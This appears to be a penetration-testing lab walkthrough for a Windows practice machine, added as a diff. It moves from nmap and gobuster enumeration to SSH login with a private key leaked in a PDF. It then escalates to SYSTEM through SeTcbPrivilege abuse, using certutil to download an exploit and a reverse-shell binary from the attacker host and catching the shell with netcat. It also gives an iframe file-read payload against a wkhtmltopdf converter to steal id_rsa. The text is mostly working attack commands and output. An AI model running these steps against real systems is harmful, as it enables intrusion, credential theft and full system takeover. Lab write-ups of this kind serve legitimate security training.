@@ -1,0 +1,65 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.201.177 > Symbolic.txt
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:40:e2:ef:21:ea:c1:77:b6:14:a3:f7:04:59:45:28 (RSA)
+|   256 f8:fb:e3:c6:16:3a:e2:62:d0:e2:ae:d4:f2:9e:6f:6d (ECDSA)
+|_  256 94:5e:97:ad:f9:0f:81:b6:6b:3b:bd:98:43:c0:0d:6a (ED25519)
+80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+| http-methods: 
+|   Supported Methods: POST OPTIONS HEAD GET TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-title: WebPage to PDF
+
+http website shows Powered by WkhtmltoPdf
+Webpage to PDF Converter by p4yl0ad
+
+p4yl0ad possible user name.
+
+$ gobuster dir -u http://192.168.201.177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+Found folder pdfs
+
+http://192.168.201.177/pdfs/abf668cc40f70bd74ce74e67eb397c27.pdf
+Found id_rsa private key
+
+$ ssh -i id_rsa p4yl0ad@192.168.201.177
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+p4yl0ad@SYMBOLIC C:\Users\p4yl0ad>whoami
+symbolic\p4yl0ad
+
+SeTcbPrivilege                Act as part of the operating system Enabled
+
+# https://github.com/b4lisong/SeTcbPrivilege-Abuse/tree/main
+PS C:\temp> certutil.exe -split -f -urlcache "http://192.168.45.179/TcbElevation-x64.exe" 
+PS C:\temp> certutil.exe -split -f -urlcache "http://192.168.45.179/sh443.exe"
+PS C:\temp> .\TcbElevation-x64.exe -h
+usage: TcbElevation.exe [ServiceName] [CmdLine]
+PS C:\temp> .\TcbElevation-x64.exe test1 "C:\temp\sh443.exe"
+
+$ rlwrap nc -nlvp 443 
+listening on [any] 443 ...
+connect to [192.168.45.179] from (UNKNOWN) [192.168.201.177] 49832
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+#######################################################
+Other way get initial access:
+create a test.html
+$ cat test.html                                                            
+<iframe src="C:\Users\p4yl0ad\.ssh\id_rsa" height=1000 width=1000 />
+
+$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
+
+input 192.168.45.179/test.html and achieve LFI to get users id_rsa
+
+C:\Windows\system32\drivers\etc\hosts default location that can use to test LFI
+
+
